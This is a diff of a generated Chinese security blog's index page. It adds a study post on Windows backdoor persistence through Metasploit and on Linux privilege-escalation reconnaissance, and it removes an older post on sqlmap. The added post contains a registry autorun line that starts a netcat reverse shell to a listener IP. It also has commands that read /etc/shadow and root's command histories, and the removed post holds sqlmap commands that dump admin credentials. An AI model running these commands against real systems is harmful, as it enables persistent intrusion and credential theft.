@@ -64,6 +64,77 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-windows后门植入和linux信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
+  <time datetime="2021-07-28T13:40:14.000Z" itemprop="datePublished">2021-07-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="windows后门植入"><a href="#windows后门植入" class="headerlink" title="windows后门植入"></a>windows后门植入</h1><p>持久化的监听:</p>
+<p>handle:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-H    配置RHOST&#x2F;LHOST(用于监听)</span><br><span class="line">-P    配置RPORT&#x2F;LPORT(用于监听)</span><br><span class="line">-e    指定编码,连接时会对stage进行编码</span><br><span class="line">-p    指定一个payload</span><br><span class="line">-x    加上这个参数,后台监听就会关闭</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="持久化后门"><a href="#持久化后门" class="headerlink" title="持久化后门"></a>持久化后门</h2><p><strong>msf中的持久化后门:</strong></p>
+<p>run persistence</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A 自动开启匹配的监听器等待用户连接</span><br><span class="line">-P 指定payload,默认windows/meterpreter/reverse_tcp</span><br><span class="line">-S 开机的时候以服务的方式去运行后门(system权限)</span><br><span class="line">-T 指定一个模板</span><br><span class="line">-U 用户登入的时候做一个反弹</span><br><span class="line">-X 当系统运行的时候做一个反弹</span><br><span class="line">-i 时间间隔(每隔几秒反弹一次)</span><br><span class="line">-p 指定监听的端口</span><br><span class="line">-r 监听器ip</span><br></pre></td></tr></table></figure>
+
+<p><code>example:  run persistence -U -X -i -r LHOST -p LPORT</code></p>
+<p>其他的persistence模块: search persistence</p>
+<p>自启动后门:</p>
+<p><code>注册表的方式&#123;自启动路径很多&#125;、服务的方式&#123;sc 创建服务&#125;、自启动文件夹&#123;shell:startup&#125;,计划任务(只能反弹一次,在指定的时间反弹)</code></p>
+<p><code>注册表的方式: reg add HKLM\.... /v xxx /f /d nc 192.168.1.135 4444 -e cmd</code></p>
+<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>id    查看当前的用户所在的组别信息</p>
+<p>uname -a     查看内核版本的全部信息</p>
+<p>cat /proc/version    查看内核版本的全部信息</p>
+<p>cat /etc/*release        查看发行版信息</p>
+<p>dpkg -l                         查看安装包(根据安装的包的版本找漏洞)</p>
+<p>crontab                        计划任务</p>
+<p>​    1.指令的方式: crontab -e 计划任务的内容</p>
+<p>​    2.以文件的形式写计划任务: /etc/crontab ,以这种方式写计划任务,指令看不到内容</p>
+<p>/sbin/ifconfig            查看网络的配置信息</p>
+<p>cat /etc/passwd        普通用户可以查看,内容是账号密码信息(密码放在shadow里)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL</span><br><span class="line"></span><br><span class="line">root    用户名</span><br><span class="line">x        占位符--&gt;密码</span><br><span class="line">0        uid</span><br><span class="line">0        gid</span><br><span class="line">root    描述信息</span><br><span class="line">&#x2F;root    家目录</span><br><span class="line">&#x2F;bin&#x2F;bash    执行环境</span><br></pre></td></tr></table></figure>
+
+<p>cat /etc/shadow        特权用户才能查看,存放账号密码信息</p>
+<p>cat /root/.mysql_history    查看数据库历史操作记录</p>
+<p>​    <code>数据库: 查看数据库内容,读取文件,上传文件,提取</code></p>
+<p>cat /root/.bash_history        查看历史操作记录</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/nul    查找具有suid应用程序(默认以root权限执行的程序)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find     指令</span><br><span class="line">&#x2F;         根目录(查找位置)</span><br><span class="line">-perm     权限</span><br><span class="line">-u        用户(s&#x3D;特权)</span><br><span class="line">-type    类型</span><br><span class="line">f        文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;nul    过滤错误信息(不显示错误信息)</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cku2l99zl000izgvjce6r8nmt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-windows提权" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/" class="article-date">
@@ -140,7 +211,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="cktx2e6a1000kwovj3uja4mrz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="cku2l99zn000lzgvjg5vl6pf1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -199,7 +270,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="cktx2e69q000gwovj6sqkcrxw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="cku2l99zd000fzgvjfr8786sa" class="article-share-link">Share</a>
       
       
     </footer>
@@ -317,7 +388,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="cktx2e6930001wovj1dsdc65e" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="cku2l99yt0001zgvjb8a702b0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -377,7 +448,7 @@
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#x72;&#100;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#x72;&#100;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#115;&#x73;&#119;&#x6f;&#114;&#100;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#x70;&#x61;&#115;&#x73;&#119;&#x6f;&#114;&#100;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -427,7 +498,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="cktx2e6990004wovj14nf4cin" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="cku2l99yw0003zgvj7zgx0v7i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -485,7 +556,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="cktx2e69c0006wovj26rpc3l5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="cku2l99yy0006zgvj87eldf7w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -595,7 +666,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cktx2e6a0000jwovj0372gzk5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cku2l99zn000kzgvjerhkff13" class="article-share-link">Share</a>
       
       
     </footer>
@@ -647,7 +718,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="cktx2e6a7000swovjfztweo7g" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="cku2l99zt000tzgvj0qsb7f3v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -724,7 +795,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="cktx2e6a6000rwovjee886sk8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="cku2l99zr000rzgvjhiqbeadx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -761,44 +832,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="cktx2e69a0005wovjb6uadaq5" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2020-08-27T12:28:19.000Z" itemprop="datePublished">2020-08-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/">SQLlow等级工具注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>SQLMAP利用方式：<br>1.先去拿取这个网站的数据库<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> –current -db                            –得到当前数据库：sqltext<br>2.再拿取这个网站数据库的数据表<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext –tables                     –得到当前数据库中的数据表：admin、sqltext<br>3.然后再获取这张数据表中的数据列<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin –columns           –得到当前数据库中的数据表中的数据列：id、user、pwd<br>4.最后得到相应的数据<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin -C uesr,pwd –dump </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="cktx2e6960002wovj1tiddlbn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="cku2l99yx0004zgvjca8g6nx7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -844,6 +878,10 @@
       <ul>
         
           <li>
+            <a href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">sql注入请求方法</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a>
           </li>
         
@@ -857,10 +895,6 @@
         
           <li>
             <a href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">Web网站框架安全</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/">网站数据包结构分析</a>
           </li>
         
       </ul>
